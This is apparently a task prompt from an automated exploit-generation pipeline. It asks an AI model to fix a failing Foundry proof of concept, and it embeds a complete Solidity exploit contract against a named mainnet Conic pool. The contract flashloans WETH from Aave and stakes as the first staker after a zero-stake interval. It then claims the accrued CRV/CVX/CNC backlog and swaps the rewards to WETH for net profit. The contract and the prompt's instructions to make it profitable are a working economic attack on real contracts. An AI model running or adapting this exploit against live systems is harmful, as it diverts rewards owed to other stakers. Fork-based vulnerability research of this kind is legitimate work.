You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: First staker after a zero-stake interval can capture all rewards accrued while nobody was staked
- claim: `poolCheckpoint()` computes newly accrued CRV/CVX/CNC against `lastHoldings`, but when `controller.lpTokenStaker().getBalanceForPool(pool)` is zero it skips `_updateEarned()` and therefore does not advance `lastHoldings`. Rewards that accrue during a zero-stake interval remain unassigned and are later distributed across the next non-zero staked supply, letting the first new staker absorb the entire backlog.
- impact: A user can stake a dust amount after an idle period and appropriate all rewards that accumulated while no one was staked. This diverts materially valuable CRV/CVX/CNC from the intended reward flow and creates a permissionless reward-theft/windfall vector.
- exploit_paths: ["All LP staking for a pool drops to zero while the pool's Curve/Convex positions continue accruing rewards.", "No one calls a path that advances `lastHoldings` during the zero-stake interval, so the backlog remains pending.", "An attacker stakes a minimal amount and triggers `accountCheckpoint()` or `claimEarnings()`, causing the full backlog to be distributed over the tiny current staked supply."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IConicPool {
    function underlying() external view returns (address);

    function lpToken() external view returns (address);

    function rewardManager() external view returns (address);

    function controller() external view returns (address);

    function deposit(
        uint256 underlyingAmount,
        uint256 minLpReceived,
        bool stake
    ) external returns (uint256);

    function unstakeAndWithdraw(
        uint256 conicLpAmount,
        uint256 minUnderlyingReceived
    ) external returns (uint256);
}

interface IController {
    function lpTokenStaker() external view returns (address);
}

interface ILpTokenStaker {
    function getBalanceForPool(address conicPool) external view returns (uint256);

    function getUserBalanceForPool(
        address conicPool,
        address account
    ) external view returns (uint256);
}

interface IRewardManager {
    function claimableRewards(
        address account
    ) external view returns (uint256 cncRewards, uint256 crvRewards, uint256 cvxRewards);

    function claimEarnings() external returns (uint256, uint256, uint256);
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAaveFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IUniswapRouter02 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ICurvePoolV2 {
    function coins(uint256 i) external view returns (address);

    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 minDy,
        bool useEth,
        address receiver
    ) external returns (uint256);
}

contract FlawVerifier is IAaveFlashLoanSimpleReceiver {
    address internal constant TARGET_POOL = 0xBb787d6243a8D450659E09ea6fD82F1C859691e9;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
    address internal constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
    address internal constant SUSHISWAP = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant CNC_WETH_CURVE_POOL = 0x838af967537350D2C44ABB8c010E49E32673ab94;
    address internal constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    uint256 internal constant DEFAULT_ATTACK_CAPITAL = 1 ether;
    uint256 internal constant MIN_DIRECT_CAPITAL = 1e15;

    uint256 internal _profitAmount;
    uint256 internal _wethBalanceBefore;

    error WrongUnderlying(address actualUnderlying);
    error ExistingStakeBlocksPath(uint256 totalStaked);
    error DepositDidNotCreateStake();
    error NoRewardBacklogAfterZeroStake();
    error FlashLoanCallbackUnauthorized(address caller, address initiator);
    error FlashLoanAssetMismatch(address asset);
    error FlashLoanNotRepaid(uint256 have, uint256 owe);
    error NoNetProfit(uint256 initialBalance, uint256 finalBalance);
    error MissingCncWethRoute(address coin0, address coin1);

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _wethBalanceBefore = IERC20(WETH).balanceOf(address(this));

        IConicPool pool = _pool();
        if (pool.underlying() != WETH) {
            revert WrongUnderlying(pool.underlying());
        }

        _ensureApprovals();

        if (_wethBalanceBefore >= MIN_DIRECT_CAPITAL) {
            uint256 capital = _wethBalanceBefore;
            if (capital > DEFAULT_ATTACK_CAPITAL) {
                capital = DEFAULT_ATTACK_CAPITAL;
            }

            _attackWithCapital(capital);

            uint256 wethAfterDirect = IERC20(WETH).balanceOf(address(this));
            if (wethAfterDirect <= _wethBalanceBefore) {
                revert NoNetProfit(_wethBalanceBefore, wethAfterDirect);
            }
            _profitAmount = wethAfterDirect - _wethBalanceBefore;
            return;
        }

        IAaveV3Pool(AAVE_V3_POOL).flashLoanSimple(
            address(this),
            WETH,
            DEFAULT_ATTACK_CAPITAL,
            "",
            0
        );

        uint256 wethAfterFlash = IERC20(WETH).balanceOf(address(this));
        if (wethAfterFlash <= _wethBalanceBefore) {
            revert NoNetProfit(_wethBalanceBefore, wethAfterFlash);
        }
        _profitAmount = wethAfterFlash - _wethBalanceBefore;
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        if (msg.sender != AAVE_V3_POOL || initiator != address(this)) {
            revert FlashLoanCallbackUnauthorized(msg.sender, initiator);
        }
        if (asset != WETH) {
            revert FlashLoanAssetMismatch(asset);
        }

        _attackWithCapital(amount);

        uint256 amountOwed = amount + premium;
        uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
        if (wethBalance < amountOwed) {
            revert FlashLoanNotRepaid(wethBalance, amountOwed);
        }

        _forceApprove(IERC20(WETH), AAVE_V3_POOL, amountOwed);
        return true;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attackWithCapital(uint256 capital) internal {
        ILpTokenStaker staker = _staker();
        IRewardManager rewardManager = _rewardManager();
        IConicPool pool = _pool();

        uint256 totalStakedBefore = staker.getBalanceForPool(TARGET_POOL);
        // Path stage 1: the bug only exists if the pool stayed completely unstaked.
        if (totalStakedBefore != 0) {
            revert ExistingStakeBlocksPath(totalStakedBefore);
        }

        // Path stage 2: become the first staker after the zero-stake interval.
        pool.deposit(capital, 0, true);

        uint256 attackerStake = staker.getUserBalanceForPool(TARGET_POOL, address(this));
        if (attackerStake == 0) {
            revert DepositDidNotCreateStake();
        }

        // Path stage 3: if `lastHoldings` was not advanced while nobody was staked,
        // the entire backlog now shows up as claimable to the sole staker.
        (uint256 cncBacklog, uint256 crvBacklog, uint256 cvxBacklog) = rewardManager.claimableRewards(
            address(this)
        );
        if (cncBacklog == 0 && crvBacklog == 0 && cvxBacklog == 0) {
            // Concrete fork-state failure: no unassigned rewards remained at this block.
            revert NoRewardBacklogAfterZeroStake();
        }

        rewardManager.claimEarnings();

        pool.unstakeAndWithdraw(attackerStake, 0);

        _liquidateRewardsToWeth();
    }

    function _liquidateRewardsToWeth() internal {
        _swapOnSushi(CRV);
        _swapOnSushi(CVX);
        _swapCncOnCurve();
    }

    function _pool() internal pure returns (IConicPool) {
        return IConicPool(TARGET_POOL);
    }

    function _rewardManager() internal view returns (IRewardManager) {
        return IRewardManager(_pool().rewardManager());
    }

    function _staker() internal view returns (ILpTokenStaker) {
        return ILpTokenStaker(IController(_pool().controller()).lpTokenStaker());
    }

    function _ensureApprovals() internal {
        _forceApprove(IERC20(WETH), TARGET_POOL, type(uint256).max);
        _forceApprove(IERC20(CRV), SUSHISWAP, type(uint256).max);
        _forceApprove(IERC20(CVX), SUSHISWAP, type(uint256).max);
        _forceApprove(IERC20(CNC), CNC_WETH_CURVE_POOL, type(uint256).max);
    }

    function _swapOnSushi(address token) internal {
        uint256 amountIn = IERC20(token).balanceOf(address(this));
        if (amountIn == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        IUniswapRouter02(SUSHISWAP).swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapCncOnCurve() internal {
        uint256 amountIn = IERC20(CNC).balanceOf(address(this));
        if (amountIn == 0) {
            return;
        }

        ICurvePoolV2 curvePool = ICurvePoolV2(CNC_WETH_CURVE_POOL);
        address coin0 = curvePool.coins(0);
        address coin1 = curvePool.coins(1);

        if (coin0 == CNC && coin1 == WETH) {
            curvePool.exchange(0, 1, amountIn, 0, false, address(this));
            return;
        }
        if (coin0 == WETH && coin1 == CNC) {
            curvePool.exchange(1, 0, amountIn, 0, false, address(this));
            return;
        }

        revert MissingCncWethRoute(coin0, coin1);
    }

    function _forceApprove(IERC20 token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = address(token).call(
            abi.encodeWithSelector(token.approve.selector, spender, amount)
        );
        if (!_didSucceed(ok, data)) {
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, amount));
        }
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = address(token).call(data);
        require(_didSucceed(ok, returndata), "TOKEN_CALL_FAILED");
    }

    function _didSucceed(bool ok, bytes memory returndata) internal pure returns (bool) {
        return ok && (returndata.length == 0 || abi.decode(returndata, (bool)));
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
Error: Found incompatible versions:
test/ExploitPOC.t.sol ^0.8.20 imports:
    src/FlawVerifier.sol =0.8.17

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
